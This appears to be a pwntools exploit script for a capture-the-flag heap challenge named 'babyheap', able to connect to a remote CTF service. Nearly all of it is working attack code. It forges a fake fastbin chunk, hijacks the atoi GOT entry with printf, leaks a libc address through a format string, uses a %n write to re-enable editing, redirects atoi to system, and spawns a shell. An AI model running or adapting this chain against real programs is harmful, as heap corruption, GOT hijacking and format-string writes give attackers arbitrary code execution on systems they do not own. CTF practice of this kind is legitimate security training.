#!/usr/bin/env python2

import os
import struct
from time import sleep
from pwn import *

context.terminal = 'tmux splitw -h'.split()

exe = context.binary = ELF('./babyheap')
libc = ELF('./libc.so.6')

# break *0x400B60
# break *0x4009FE
# break *0x400A63
# break *0x400B30
# break *0x400BBA


gdbscript = """
handle SIGALRM ignore
set debug-file-directory out/usr/lib/debug/lib/x86_64-linux-gnu/
continue
""".format(**locals())

def start(argv=[], *a, **kw):
	if args.GDB:
		io = gdb.debug([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		io = remote("honj.in", 4024)
	else:
		io = process([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, *a, **kw)
	return io

s = start()
menu = s.recvuntil("choice:")

def printfWrite(src, dst):
	payload = "AAAAAAAA{0}%9$x".format(p64(src))
	log.info(payload)
	s.send(payload)

def new(size, content, name):
	s.sendline("1")
	s.recvuntil("Size :")
	s.sendline(str(size))
	s.recvuntil("Content:")
	s.sendline(content)
	s.recvuntil("Name:")
	s.sendline(name)

def delete():
	s.sendline("2")

def edit(content):
	s.sendline("3")
	s.sendline(content)

def exit(content):
	s.sendline("4")
	s.sendline(content)

log.info("Prepare fake fastbin chunk using scanf padding")
pad_to_next_page = "nn"
pad_to_next_page += '\x00' * (0x1000 - 0x18 - 0x2)
pad_to_next_page += p64(0x41)
exit(pad_to_next_page)

log.info("Change lsb of *content to right after fake fastbin chunk")
new(16, "A"*15, "B"*8)

log.info("Free the fake fastbin chunk, adding it to the end of the fastbin list")
delete()

log.info("Allocate fake fastbin chunk, change *content to atoi GOT entry")
new(0x38, "A"*48+p64(exe.got["atoi"]), "B"*4)

log.info("Edit *content, atoi -> printf")
edit(p64(exe.plt["printf"]))

log.info("Extracting __libc_start_main+240 via printf attack")
s.sendline("%19$p")
s.recvuntil("0x")
libc_start_main_plus_240 = int(s.recvuntil("\n").strip(), 16)
libc_base = libc_start_main_plus_240 - libc.symbols["__libc_start_main"] - 240
assert(libc_base & 0xfff == 0)
libc_system = libc_base + libc.symbols["system"]
log.warn("AYYYYY libc at {0}".format(hex(libc_base)))

log.info("Overwriting `was_edited` variable allowing for another edit of the GOT, thnx printf <3")
been_edited=0x6020A4
s.recvuntil(":")
s.send("%9$n    {0}".format(p64(been_edited)))

log.info("Hijacking GOT again, atoi -> system")
s.sendline("3 ") # this will send 3 bytes
s.recvuntil(":")
s.sendline(p64(libc_system))

log.warn("Enjoy your shell :)")
s.sendline("/bin/sh")
s.recvuntil(":")
s.recvuntil(":")


s.interactive()